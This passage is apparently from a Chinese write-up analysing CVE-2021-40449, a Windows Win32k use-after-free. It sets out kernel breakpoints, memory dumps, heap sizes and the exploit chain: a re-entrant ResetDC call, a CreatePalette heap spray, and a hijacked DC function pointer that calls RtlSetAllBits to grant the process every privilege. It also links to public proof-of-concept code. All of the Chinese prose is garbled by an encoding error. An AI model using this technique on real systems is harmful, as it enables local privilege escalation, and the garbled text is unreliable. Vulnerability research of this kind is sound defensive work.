ˆåŸå…ˆæŒ‡å‘çš„æ˜¯é¢„å®šä¹‰çš„å›è°ƒå‡½æ•°ã€‚åœ¨POCä¸­è¦†ç›–è¿™ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œä½¿å…¶æ‰§è¡ŒPOCå®šä¹‰çš„å›è°ƒå‡½æ•°ã€‚\nåœ¨è‡ªå®šä¹‰å›è°ƒå‡½æ•°ä¸­å†æ¬¡æ‰§è¡ŒResetDCå‡½æ•°å¹¶ä¼ å…¥åŒä¸€HDCå¥æŸ„ï¼Œåˆ™ä¼šå†æ¬¡æ‰§è¡ŒNtGdiResetDCå’ŒGreResetDCInternalå‡½æ•°ï¼Œè€Œåœ¨GreResetDCInternalçš„ååŠæ®µï¼Œä¼šé‡Šæ”¾ä¼ å…¥çš„HDCå¯¹åº”çš„DCå¯¹è±¡å¹¶åˆ›å»ºæ–°çš„DCå¯¹è±¡ã€‚æ­¤æ—¶è¾¾åˆ°äº†freeæ­¥éª¤ã€‚\nåœ¨ç¬¬äºŒæ¬¡ResetDCè°ƒç”¨å®Œæˆåï¼ŒåŸDCå¯¹è±¡å·²è¢«é‡Šæ”¾ï¼Œæ­¤æ—¶å¯ä»¥é‡æ–°ç”³è¯·åŸDCå¯¹è±¡çš„å†…å­˜ç©ºé—´å¹¶å®Œæˆå†…å­˜å¸ƒå±€ï¼Œå°†åŸDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆå’Œå‡½æ•°æŒ‡é’ˆçš„å‚æ•°çš„ä½ç½®è®¾ç½®ä¸ºæƒ³è¦æ‰§è¡Œçš„å†…æ ¸å‡½æ•°çš„åœ°å€åŠå‚æ•°ã€‚åœ¨æ‰§è¡Œå®Œç¬¬ä¸€æ¬¡å›è°ƒä¹‹åï¼ŒGreResetDCInternal å°†è°ƒç”¨åŸDCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆï¼Œå³å®Œæˆäº†ä»»æ„å†…æ ¸å‡½æ•°è°ƒç”¨ï¼Œæ­¤æ—¶è¾¾åˆ°äº†useæ­¥éª¤ã€‚\nå®Œæ•´è°ƒç”¨é“¾å¦‚ä¸‹å›¾ï¼š\nå…¶ä¸­æ¼æ´ç›¸å…³çš„ç±»å®šä¹‰å¦‚ä¸‹ï¼Œå‚è€ƒhttps://github.com/ZoloZiak/WinNT4/blob/master/private/ntos/w32/ntgdi/gre/dcobj.hxx#L97\nclass DCLEVEL { public: ... HDC hdcSave; ... } class DC : public OBJECT { public: DHPDEV dhpdev_; PDEV *ppdev_; ... HDC hdcNext_; // HDCé“¾è¡¨æŒ‡é’ˆ HDC hdcPrev_; ... DCLEVEL dclevel ... }; typedef DC *PDC; class XDCOBJ /* dco */ { public: PDC pdc; ... }; typedef XDCOBJ *PXDCOBJ; class DCOBJ : public XDCOBJ /* mdo */ { public: DCOBJ() { pdc = (PDC) NULL; } DCOBJ(HDC hdc) { vLock(hdc); } ~DCOBJ() { vUnlockNoNullSet(); } }; typedef DCOBJ *PDCOBJ; ç±»ä¹‹é—´çš„å…³ç³»å¯ä»¥ç®€åŒ–ä¸ºä¸‹å›¾ï¼š\nè°ƒè¯• freeéƒ¨åˆ† åœ¨freeéƒ¨åˆ†éœ€è¦æŠŠæˆ‘ä»¬æƒ³è¦é‡Šæ”¾çš„å†…å­˜ç©ºé—´é‡Šæ”¾ï¼Œå¹¶è®©åé¢çš„useéƒ¨åˆ†æˆåŠŸç”³è¯·åˆ°è¿™å—å†…å­˜ç©ºé—´ã€‚\nè°ƒè¯•ç¯å¢ƒï¼šè™šæ‹Ÿæœºwindows 10 1607ã€ç‰©ç†æœºwindows 10 2004\nPOC:\rhttps://github.com/KaLendsi/CVE-2021-40449-Exploit\næ–­ç‚¹:\nbp win32kfull!NtGdiResetDC bp win32kfull!NtGdiResetDC+0xc1 \u0026#34;è°ƒç”¨GreResetDCInternalå‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x3a \u0026#34;è°ƒç”¨DCOBJæ„é€ å‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x116 \u0026#34;è°ƒç”¨_imp_hdcOpenDCWå‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x136 \u0026#34;ç¬¬äºŒæ¬¡DCOBJ\u0026#34; bp win32kfull!GreResetDCInternal+0x1b5 \u0026#34;è°ƒç”¨DCå¯¹è±¡å‡½æ•°æŒ‡é’ˆ\u0026#34; bp win32kfull!GreResetDCInternal+0x1d1 \u0026#34;è°ƒç”¨HmgSwapLockedHandleå‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x20d \u0026#34;è°ƒç”¨_imp_bDeleteDCInternalå‡½æ•°\u0026#34; bp cve_2021_40449!hook_DrvEnablePDEV+0x12a \u0026#34;å¾ªç¯è°ƒç”¨\u0026#34; bp win32kbase!PALMEMOBJ::bCreatePalette \u0026#34;è°ƒç”¨win32kbase!PALMEMOBJ::bCreatePalette\u0026#34; è¿è¡ŒPOCï¼Œæ–­ç‚¹bp win32kfull!NtGdiResetDCè§¦å‘æ­¤æ—¶ä¼ å…¥çš„å¥æŸ„ä¸ºrcx=00000000092105f1\nç¬¬ä¸€æ¬¡è°ƒç”¨win32kfull!GreResetDCInternal æ—¶ä¼ å…¥å„ä¸ªå‚æ•°ä¸ºrcx=00000000092105f1 rdx=0000000000000000 r8=ffffb101aadf2a44 å³ç¬¬ä¸€ä¸ªå¥æŸ„å€¼ä¸º00000000092105f1\nç¬¬ä¸€æ¬¡è°ƒç”¨æ„é€ å‡½æ•°ï¼Œåˆ©ç”¨DCå¯¹è±¡åˆ›å»ºDCOå¯¹è±¡ï¼Œæ­¤æ—¶rbxå­˜æ”¾DCOå¯¹è±¡çš„åœ°å€ï¼Œ\næ ¹æ®æ¼æ´å½¢æˆåˆ†æçš„è®¡ç®—å…¬å¼ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å¾—åˆ°DCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°çš„åœ°å€ä¸ºï¼šffffd548a1f10c30\n1: kd\u0026gt; dq rax ffffb101`aadf29c0 ffffd50e`041fd010 00000000`00000001 ffffb101`aadf29d0 00000268`6e766b20 000000d7`97aff680 ffffb101`aadf29e0 00000000`00000000 00000000`092105f1 ffffb101`aadf29f0 00000000`00000000 ffffd50e`041fb030 ffffb101`aadf2a00 ffffb101`aadf2b80 ffffd548`a1f18fe6 ffffb101`aadf2a10 00000000`00000001 00000000`00000000 ffffb101`aadf2a20 ffffb101`aadf2a44 ffffd50e`041fb030 ffffb101`aadf2a30 000000d7`97aff5d0 00000000`00000000 // rbxå­˜æ”¾äº†æ„é€ å‡½æ•°äº§ç”Ÿçš„DCOå¯¹è±¡åœ°å€ 1: kd\u0026gt; dq rbx ffffd50e`041fd010 00000000`092105f1 80000001`00000000 ffffd50e`041fd020 ffffd800`b45ad780 00000268`6e75ea10 ffffd50e`041fd030 00100010`00000000 00000000`00000000 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ffffd50e`041fd050 ffffd800`b56f1260 00000009`1000a01f ffffd50e`041fd060 ffffd50e`041fd3d0 00000000`0088000b ffffd50e`041fd070 ffffd50e`000004f0 ffffd50e`00005d90 ffffd50e`041fd080 00000001`00000000 00000000`00000000 // ffffd50e`041fd010ä¸ºrbxçš„å€¼ï¼Œæ­¤å¤„ffffd50e`041fd010+0x30ä¸ºPDCçš„åœ°å€ï¼ŒPDCæŒ‡å‘DCå¯¹è±¡å³DCå¯¹è±¡åœ°å€ä¸ºffffd50e`00052030 // è®¡ç®—å…¬å¼ *(dcoåœ°å€+0x30)=dcåœ°å€ 1: kd\u0026gt; dq ffffd50e`041fd010+0x30 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ffffd50e`041fd050 ffffd800`b56f1260 00000009`1000a01f ffffd50e`041fd060 ffffd50e`041fd3d0 00000000`0088000b ffffd50e`041fd070 ffffd50e`000004f0 ffffd50e`00005d90 ffffd50e`041fd080 00000001`00000000 00000000`00000000 ffffd50e`041fd090 00000000`00000000 00000000`00000000 ffffd50e`041fd0a0 ffffd50e`00001a10 ffffd50e`00004cb0 ffffd50e`041fd0b0 ffffd50e`000105f0 00000000`00000000 // ffffd50e`00052030+0xad0å¤„ä¸ºDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘äº†ä¸€ä¸ªå‡½æ•° // è®¡ç®—å…¬å¼ *(dcåœ°å€ +0xad0)=å‡½æ•°åœ°å€ 1: kd\u0026gt; dq ffffd50e`00052030+0xad0 ffffd50e`00052b00 ffffd548`a1f10c30 ffffd548`a1db18c0 ffffd50e`00052b10 00000000`00000000 00000000`00000000 ffffd50e`00052b20 00000000`00000000 ffffd548`a1f10930 ffffd50e`00052b30 00000000`00000000 ffffd548`a1f11dc0 ffffd50e`00052b40 ffffd548`a1f0e6b0 ffffd548`a1f11b00 ffffd50e`00052b50 00000000`00000000 ffffd548`a1f0cd70 ffffd50e`00052b60 ffffd548`a1f0d1f0 ffffd548`a1f112f0 ffffd50e`00052b70 00000000`00000000 00000000`00000000 // ä»¥ä¸‹ä¸ºå‡½æ•°çš„æ±‡ç¼– 1: kd\u0026gt; u ffffd548`a1f10c30 win32kfull!UMPDDrvResetPDEV: ffffd548`a1f10c30 48895c2418 mov qword ptr [rsp+18h],rbx ffffd548`a1f10c35 4889742420 mov qword ptr [rsp+20h],rsi ffffd548`a1f10c3a 57 push rdi ffffd548`a1f10c3b 4883ec70 sub rsp,70h ffffd548`a1f10c3f 488b05ba440800 mov rax,qword ptr [win32kfull!_security_cookie (ffffd548`a1f95100)] ffffd548`a1f10c46 4833c4 xor rax,rsp ffffd548`a1f10c49 4889442468 mov qword ptr [rsp+68h],rax ffffd548`a1f10c4e 488bf9 mov rdi,rcx ä¹‹åé€šè¿‡hdcOpenDCWå‡½æ•°è°ƒç”¨ç”¨æˆ·æ¨¡å¼çš„å›è°ƒå‡½æ•°ï¼Œåœ¨å›è°ƒå‡½æ•°ä¸­å†æ¬¡è°ƒç”¨ResetDCå‡½æ•°ï¼Œæ­¤æ—¶ä¼ å…¥çš„HDCå’Œç¬¬ä¸€æ¬¡è°ƒç”¨ResetDCçš„æ˜¯åŒä¸€ä¸ªå¥æŸ„ã€‚\nç¬¬äºŒæ¬¡è°ƒç”¨win32kfull!GreResetDCInternal æ—¶ï¼Œä¼ å…¥åŒä¸€ä¸ªHDCå¥æŸ„ï¼Œå³å¯¹åº”åŒä¸€ä¸ªDCå¯¹è±¡ã€‚\n0: kd\u0026gt; t win32kfull!GreResetDCInternal: ffffd548`a1f03e58 488bc4 mov rax,rsp 1: kd\u0026gt; rrcx rcx=00000000092105f1 ç¬¬äºŒæ¬¡è°ƒç”¨DCOBJæ„é€ å‡½æ•°æ—¶ï¼Œç”±äºä¼ å…¥çš„æ˜¯åŒä¸€ä¸ªHDCå¥æŸ„ï¼Œæ‰€ä»¥HDCå¥æŸ„å¼•ç”¨æ¬¡æ•°+1ï¼ŒåŒæ—¶ä¸¤æ¬¡è°ƒç”¨æ„é€ å‡½æ•°æ„é€ çš„å¯¹è±¡å…³è”åˆ°åŒä¸€ä¸ªDCå¯¹è±¡ã€‚\nä¹‹åç¬¬äºŒæ¬¡è°ƒç”¨win32kfull!_imp_hdcOpenDCWå‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°å†…æ‰§è¡Œæ”¿ç­–å›è°ƒå‡½æ•°ï¼Œwin32kfull!imp_hdcOpenDCWè¿”å›ä¸€ä¸ªHDCå¥æŸ„å€¼ä¸º0000000003210041ï¼Œå³åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„DCå¯¹è±¡ã€‚ä¹‹åé€šè¿‡æ–°åˆ›å»ºçš„DCå¯¹è±¡åˆ›å»ºDCOå¯¹è±¡ã€‚\nåœ¨win32kfull!GreResetDCInternalååŠæ®µä¼šè°ƒç”¨win32kfull!_imp_HmgSwapLockedHandleContentsäº¤æ¢ç¬¬ä¸€ä¸ªHDCå¥æŸ„å’Œç¬¬äºŒæ¬¡è°ƒç”¨win32kfull!imp_hdcOpenDCWåˆ›å»ºçš„HDCå¥æŸ„ã€‚\nè°ƒç”¨win32kfull!_imp_HmgSwapLockedHandleContentsä¹‹åä¸¤ä¸ªå¥æŸ„å¯¹åº”çš„DCå†…å®¹ä¸ºå·²ç»å‘ç”Ÿäº†äº¤æ¢\n// ä»¥ä¸‹å†…å®¹ä¸ºæ—§DCå¯¹è±¡ï¼Œä½†æ˜¯å¥æŸ„ä¸ºæ–°å¥æŸ„ 1: kd\u0026gt; dq ffffd50e041fd010 ffffd50e`041fd010 00000000`03210041 80000001`00000000 ...... 1: kd\u0026gt; dq ffffd50e03fee010 // ä»¥ä¸‹å†…å®¹ä¸ºæ–°DCå¯¹è±¡ï¼Œä½†å¥æŸ„ä¸ºæ—§å¥æŸ„ ffffd50e`03fee010 00000000`092105f1 80000002`00000000 ...... ä¹‹åè°ƒç”¨win32kfull!_imp_bDeleteDCInternalä¼ å…¥HDCå¥æŸ„ï¼Œè¯¥å‡½æ•°ä¼šé‡Šæ”¾HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ï¼Œè€Œæ­¤æ—¶ä¼ å…¥è¯¥å‡½æ•°çš„HDCå¥æŸ„ä¸ºç¬¬äºŒæ¬¡è°ƒç”¨hdcOpenDCWå‡½æ•°è¿”å›çš„å¥æŸ„ï¼Œä½†ä¹‹å‰äº¤æ¢è¿‡æ–°æ—§å¥æŸ„ï¼Œæ‰€ä»¥å®é™…ä¸Šé‡Šæ”¾çš„æ˜¯æ—§HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ã€‚\nä¹‹å‰è®¡ç®—å‡½æ•°æŒ‡é’ˆçš„æ—¶å€™ï¼Œæˆ‘ä»¬çŸ¥é“DCO +0x30æ˜¯æŒ‡å‘DCå¯¹è±¡çš„æŒ‡é’ˆï¼Œæ‰€ä»¥åœ¨è°ƒç”¨win32kfull!_imp_bDeleteDCInternalå‡½æ•°ä¹‹åï¼ŒåŸDCå¯¹è±¡çš„å†…å­˜ç©ºé—´å·²ç»è¢«é‡Šæ”¾ï¼Œè¾¾æˆäº†use-after-freeçš„ç¬¬ä¸€æ­¥freeã€‚\nfunction pointer=* (* (DCO +0x30)+0xad0)ï¼Œå…¶ä¸­DCO +0x30å³æŒ‡å‘DCå¯¹è±¡çš„æŒ‡é’ˆ\n0: kd\u0026gt; dq ffffd50e041fd010+0x30 // å–DCå¯¹è±¡åœ°å€ ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ...... 0: kd\u0026gt; !pool ffffd50e`00052030 // DCå¯¹è±¡çš„å†…å­˜å·²è¢«é‡Šæ”¾ï¼Œå¤§å°ä¸ºe30 Pool page ffffd50e00052030 region is Paged session pool *ffffd50e00052000 size: e30 previous size: 0 (Free ) *GDev Pooltag GDev : Gdi pdev ffffd50e00052e30 size: 10 previous size: e30 (Free) Free ffffd50e00052e40 size: 1c0 previous size: 10 (Allocated) Usqu ä¹‹ååªéœ€è¦ç”³è¯·è¿™å—å†…å­˜ç©ºé—´å¹¶æ„é€ ï¼Œåˆšåˆ é™¤çš„æ—¶å€™ï¼Œè™½ç„¶DCå¯¹è±¡å·²ç»è¢«é‡Šæ”¾ï¼Œä½†å‡½æ•°æŒ‡é’ˆè¿˜æ˜¯æŒ‡å‘æ­£ç¡®çš„å‡½æ•°åœ°å€ï¼Œæ¥ä¸‹æ¥å°±è¦ç”³è¯·ç©ºé—´ï¼Œè¦†ç›–è¿™å—å†…å­˜ç©ºé—´çš„å‡½æ•°æŒ‡é’ˆçš„å€¼å³å¯ã€‚\n0: kd\u0026gt; dq ffffd50e041fd010+0x30\t// å–DCå¯¹è±¡åœ°å€ ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 0: kd\u0026gt; dq ffffd50e`00052030+0xad0\t// å–DCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆ ffffd50e`00052b00 ffffd548`a1f10c30 ffffd548`a1db18c0 0: kd\u0026gt; u ffffd548`a1f10c30 win32kfull!UMPDDrvResetPDEV: ffffd548`a1f10c30 48895c2418 mov qword ptr [rsp+18h],rbx ffffd548`a1f10c35 4889742420 mov qword ptr [rsp+20h],rsi ffffd548`a1f10c3a 57 push rdi ffffd548`a1f10c3b 4883ec70 sub rsp,70h ffffd548`a1f10c3f 488b05ba440800 mov rax,qword ptr [win32kfull!_security_cookie (ffffd548`a1f95100)] ffffd548`a1f10c46 4833c4 xor rax,rsp ffffd548`a1f10c49 4889442468 mov qword ptr [rsp+68h],rax ffffd548`a1f10c4e 488bf9 mov rdi,rcx use éƒ¨åˆ† æ³¨ï¼šæ­¤éƒ¨åˆ†ä¸ºç¬¬äºŒæ¬¡è°ƒè¯•ï¼Œæ‰€ä»¥å¥æŸ„ã€å†…å­˜åœ°å€å’Œå‰éƒ¨åˆ†ä¸ä¸€æ ·ã€‚\nåœ¨pocé‡Œé¢ä¼šè°ƒç”¨CreatePaletteå‡½æ•°ï¼Œè¯¥æ­¤å‡½æ•°ä¼šç”³è¯·å†…æ ¸å †ï¼Œ\nç¬¬ä¸€ä¸ªå¥æŸ„rcx=0000000015213372\n// ç¬¬ä¸€ä¸ªDCOå¯¹è±¡ 0: kd\u0026gt; dq rbx DBGHELP: SharedUserData - virtual symbol module ffff885e`847d2620 00000000`15213372 80000001`00000000 ...... // ç¬¬ä¸€ä¸ªPDC æŒ‡å‘DCå¯¹è±¡ 0: kd\u0026gt; dq ffff885e`847d2620+0x30 ffff885e`847d2650 ffff885e`80063030 00000000`00000000 ...... // ç¬¬ä¸€ä¸ªDCå¯¹è±¡ 0: kd\u0026gt; dq ffff885e`80063030 ffff885e`80063030 00000000`00000000 00000000`00000000 ffff885e`80063040 00000000`00000000 ffff885e`80046010 ffff885e`80063050 00000001`00000001 ffff885e`80063030 ffff885e`80063060 00000000`00000000 00000000`00008180 ffff885e`80063070 ffffb48d`a36b4e50 00000000`00000000 ffff885e`80063080 00000000`00000000 00000000`00000000 ffff885e`80063090 00000000`00000000 00000000`00000000 ffff885e`800630a0 00000000`00000000 00000000`00000000 ç¬¬äºŒä¸ªå¥æŸ„rax=0000000001211b60\n1: kd\u0026gt; dq rdx DBGHELP: SharedUserData - virtual symbol module ffff885e`84121620 00000000`01211b60 80000001`00000000 ...... 1: kd\u0026gt; dq rdx+0x30 ffff885e`84121650 ffff885e`8006b030 00000000`00000000 ...... 1: kd\u0026gt; dq ffff885e`8006b030 ffff885e`8006b030 00000000`00000000 00000000`00000000 ffff885e`8006b040 00000000`00000000 ffff885e`80063030 ffff885e`8006b050 00000001`00000001 ffff885e`8006b030 ffff885e`8006b060 00000000`00000000 00000000`00008180 ffff885e`8006b070 ffffb48d`a317b8b0 00000000`00000000 ffff885e`8006b080 00000000`00000000 00000000`00000000 ffff885e`8006b090 00000000`00000000 00000000`00000000 ffff885e`8006b0a0 00000000`00000000 00000000`00000000 åœ¨DeleteDCInternelè°ƒç”¨ä¹‹åç¬¬ä¸€ä¸ªDCå¯¹è±¡çš„å†…å­˜ç©ºé—´å·²ç»è¢«é‡Šæ”¾\n0: kd\u0026gt; !pool ffff885e`80063030 // æ³¨æ„ï¼Œæ­¤æ—¶DCå¯¹è±¡åœ°å€è·ç¦»å †å¤´åœ°å€ä¸º0x30å¤§å° Pool page ffff885e80063030 region is Paged session pool *ffff885e80063000 size: e30 previous size: 0 (Free ) *GDev Pooltag GDev : Gdi pdev ffff885e80063e30 size: 70 previous size: e30 (Free) Free ffff885e80063ea0 size: b0 previous size: 70 (Free ) Usqm ffff885e80063f50 size: b0 previous size: b0 (Allocated) Usqm æ ¹æ®è°ƒè¯•ï¼Œå¯ä»¥å¾—çŸ¥é‡Šæ”¾çš„DCå¯¹è±¡å†…å­˜å¤§å°ä¸º0xe30ï¼Œæ‰€ä»¥è¦è¦†ç›–å‡½æ•°æŒ‡é’ˆæ—¶ï¼Œæ‰€ç”³è¯·çš„å†…å­˜ä¹Ÿè¦åˆšåˆšå¥½æˆ–è€…æ¥è¿‘è¿™å—å†…å­˜å¤§å°æ‰æœ‰å¯èƒ½ç”³è¯·åˆ°ã€‚åœ¨pocé‡Œé¢ï¼Œä½¿ç”¨CreatePaletteç”³è¯·è¿™å—å†…æ ¸å †ã€‚è¿™ä¸ªå‡½æ•°ä¼šé€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸å‡½æ•°win32kfull!NtGdiCreatePaletteInternalï¼Œè¯¥å‡½æ•°è°ƒç”¨win32kbase!PALMEMOBJ::bCreatePaletteåˆ›é€ Paletteå¯¹è±¡ï¼Œwin32kbase!PALMEMOBJ::bCreatePaletteä¼šè°ƒç”¨AllocateObjectä¸ºæ–°å¯¹è±¡ç”³è¯·ç©ºé—´ï¼Œæœ€ç»ˆé€šè¿‡è°ƒç”¨ExAllocatePoolWithTagå‡½æ•°åˆ†é…å †ç©ºé—´ï¼Œæ•´ä¸ªè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\n0: kd\u0026gt; kb # RetAddr : Call Site 00 ffff880c`b95d39f4 : win32kbase!Win32AllocPool 01 ffff880c`b95d0042 : win32kbase!AllocateObject+0xc4 02 ffff880c`b9309ecc : win32kbase!PALMEMOBJ::bCreatePalette+0xb2 03 fffff800`b175a193 : win32kfull!NtGdiCreatePaletteInternal+0xcc 04 00007ffe`a2cb2604 : nt!KiSystemServiceCopyEnd+0x13 05 00007ff7`e44c2fe1 : win32u!NtGdiCreatePaletteInternal+0x14 06 00000000`00000d94 : cve_2021_40449!createPaletteofSize1+0xd1 [C:\\Users\\mimi\\source\\repos\\test\\cve-2021-40449\\main.cpp @ 71] ....... 2e 00007ffe`a2e9b26f : 0x000000d1`a374ef69 2f 00007ffe`a39e1a4a : gdi32full!GdiPrinterThunk+0x21f 30 00007ffe`a61889e4 : USER32!__ClientPrinterThunk+0x3a 31 00007ffe`a2cb6dc4 : ntdll!KiUserCallbackDispatcherContinue 32 00007ffe`a2e7edda : win32u!NtGdiResetDC+0x14 33 00007ffe`a3682371 : gdi32full!ResetDCWInternal+0x17a 34 00007ff7`e44c3296 : GDI32!ResetDCW+0x31 35 00000000`00000000 : cve_2021_40449!main+0x146 [C:\\Users\\mimi\\source\\repos\\test\\cve-2021-40449\\main.cpp @ 685] win32kbase!Win32AllocPoolä»£ç å¦‚ä¸‹ï¼Œæœ€ç»ˆæ˜¯é€šè¿‡è°ƒç”¨ExAllocatePoolWithTagç”³è¯·å †ï¼Œwin32kbase!Win32AllocPoolçš„a1å‚æ•°ä¸ºè¦ç”³è¯·çš„å †å†…å­˜å¤§å°ï¼Œè°ƒè¯•è¿‡ç¨‹ä¸­å¯ä»¥å¾—çŸ¥å…¶è¦ç”³è¯·0xe20å¤§å°çš„å †ï¼ŒåŠ ä¸Šå †å¤´ï¼Œåˆšå¥½æ¥è¿‘åˆšé‡Šæ”¾çš„0xe3å¤§å°çš„å †ç©ºé—´å¤§å°ã€‚\n__int64 __fastcall Win32AllocPool(__int64 a1, unsigned int a2) { unsigned int v2; // ebx __int64 v3; // rdi __int64 result; // rax v2 = a2; v3 = a1; if ( (signed int)IsWin32AllocPoolImplSupported_0() \u0026lt; 0 ) result = 0i64; else result = Win32AllocPoolImpl_0(33i64, v3, v2); return result; } åŒæ—¶åœ¨Pocä»£ç åˆ†æé‡Œé¢åˆ†æäº†DCå¯¹è±¡å‡½æ•°æŒ‡é’ˆå’Œå †å¤´ä¹‹é—´çš„ä½ç½®å…³ç³»ï¼Œæ‰€ä»¥é€šè¿‡æ„é€ ä¼ å…¥CreatePaletteçš„LOGPALETTEç»“æ„å¯ä»¥åˆšåˆšå¥½è¦†ç›–åŸDCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆä»¥åŠè¯¥å‡½æ•°æŒ‡é’ˆè¦è°ƒç”¨çš„å‚æ•°ï¼Œå†…å­˜åˆ†å¸ƒå…·ä½“è§https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp é‡Œé¢çš„æ³¨é‡Šã€‚\né€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨RtlSetAllBitså‡½æ•°å¹¶ä¼ å…¥RtklBitMapå‹æŒ‡é’ˆï¼Œå…¶ä¸­RtlBitMapçš„bufferæŒ‡å‘POCè¿›ç¨‹è‡ªèº«çš„æƒé™ä½ï¼Œå¦‚ä¸‹å›¾ï¼š\ntypedef struct _RTL_BITMAP { ULONG SizeOfBitMap; ULONG *Buffer; } RTL_BITMAP, *PRTL_BITMAP; 0: kd\u0026gt; dq ffff885e80063000+0x750 // æ­¤å¤„ä¸ºRtlBitMapåœ°å€ ffff885e`80063750 ffffb48d`a3839010 ffffffff`ffffffff ffff885e`80063760 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063770 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063780 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063790 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637a0 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637b0 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637c0 ffffffff`ffffffff ffffffff`ffffffff 0: kd\u0026gt; dq ffffb48d`a3839010\t// æ­¤å¤„å­˜æ”¾äº†RtlBitMapç»“æ„ï¼Œ0x00-0x08ä¸ºsizeï¼Œ0x08-0x10ä¸ºbufferæŒ‡é’ˆï¼ŒæŒ‡å‘äº†è‡ªèº«çš„æƒé™ä½ ffffb48d`a3839010 00000000`00000080 ffffde8f`1fb2e9d0 ffffb48d`a3839020 41414141`41414141 41414141`41414141 ffffb48d`a3839030 00000000`00000000 00000000`00000000 ffffb48d`a3839040 00000000`00000000 00000000`00000000 ffffb48d`a3839050 00000000`00000000 00000000`00000000 ffffb48d`a3839060 00000000`00000000 00000000`00000000 ffffb48d`a3839070 00000000`00000000 00000000`00000000 ffffb48d`a3839080 00000000`00000000 00000000`00000000 0: kd\u0026gt; dq ffffde8f`1fb2e9d0 ffffde8f`1fb2e9d0 00000006`02880000 00000000`00800000 ffffde8f`1fb2e9e0 00000000`00800000 00000000`00000000 ffffde8f`1fb2e9f0 00000000`00000000 00000000`00000000 ffffde8f`1fb2ea00 20010000`00000000 0000000f`00000001 ffffde8f`1fb2ea10 000001e0`00000000 00000000`00001000 ffffde8f`1fb2ea20 00000000`00000000 ffffde8f`1fb2ee18 ffffde8f`1fb2ea30 00000000`00000000 ffffde8f`1f1007f0 ffffde8f`1fb2ea40 ffffde8f`1f1007f0 ffffde8f`1f10080c è°ƒç”¨DCé‡Œé¢çš„å‡½æ•°æŒ‡é’ˆä¹‹å‰ï¼Œè‡ªèº«æƒé™ä½ä¸ºæ­£å¸¸æƒé™ã€‚\nè°ƒç”¨å‡½æ•°æŒ‡é’ˆä¹‹åï¼Œå¯ä»¥çœ‹åˆ°æƒé™ä½å…¨éƒ¨ç½®ä¸ºäº†1\nè¡¥ä¸åˆ†æ åœ¨æ¼æ´åˆ©ç”¨åˆ†æé‡Œé¢åˆ†æè¿‡æ¼æ´å½¢æˆåŸå› æ˜¯å› ä¸ºåœ¨è°ƒç”¨GreResetDCInternalå‡½æ•°æ—¶ï¼Œä½¿ç”¨DCå¯¹è±¡æŒ‡é’ˆçš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥DCå¯¹è±¡æ˜¯å¦å¼‚å¸¸ã€‚è€Œåˆ©ç”¨è¯¥æ¼æ´æ˜¯é€šè¿‡åœ¨è°ƒç”¨å›è°ƒå‡½æ•°æ—¶è°ƒç”¨ResetDCå®ç°çš„ã€‚\næˆ‘ä»¬å†æ¬¡å›é¡¾ä¸€ä¸‹æ¼æ´å‡½æ•°ï¼Œåœ¨è°ƒç”¨hdcOpenDCWä¹Ÿå°±æ˜¯åœ¨è°ƒç”¨å›è°ƒå‡½æ•°ä¹‹å‰ä¼šé€šè¿‡DCOçš„æ„é€ å‡½æ•°ä»DCæ„é€ DCOå¯¹è±¡ï¼Œåœ¨åŸºæœ¬æ¦‚å¿µä¸­çŸ¥é“ï¼Œå†…æ ¸å¯¹è±¡æ¯è¢«å¼•ç”¨ä¸€æ¬¡åˆ™å¯¹è±¡å¼•ç”¨è®¡æ•°å™¨å€¼ä¼šåŠ ä¸€ã€‚è°ƒç”¨æ„é€ å‡½æ•°æ—¶ï¼ŒDCå¯¹è±¡å¼•ç”¨åŠ ä¸€ï¼Œæ­£å¸¸æƒ…å†µä¸‹æ­¤æ—¶DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°è¦ä¸º1ã€‚å¦‚æœåœ¨å›è°ƒå‡½æ•°ä¸­å†æ¬¡è°ƒç”¨ResetDCï¼Œåˆ™ä¼šç¬¬äºŒæ¬¡è°ƒç”¨GreResetDCInternalï¼Œå†æ¬¡è°ƒç”¨DCOçš„æ„é€ å‡½æ•°ï¼ŒDCå¯¹è±¡å¼•ç”¨å†æ¬¡åŠ ä¸€ï¼Œæ­¤æ—¶å¼•ç”¨æ¬¡æ•°ä¸º2ã€‚\næ‰€ä»¥åˆ¤æ–­DCå¯¹è±¡å¼‚å¸¸å¯ä»¥é€šè¿‡åˆ¤æ–­DCå¯¹è±¡çš„å¼•ç”¨æ¬¡æ•°å®ç°ã€‚\n__int64 __usercall GreResetDCInternal@\u0026lt;rax\u0026gt;(HDC a1@\u0026lt;rcx\u0026gt;, __int64 a2@\u0026lt;rdx\u0026gt;, int *a3@\u0026lt;r8\u0026gt;) { __int64 v24; // [rsp+50h] [rbp-20h] __int64 v25; // [rsp+60h] [rbp-10h] 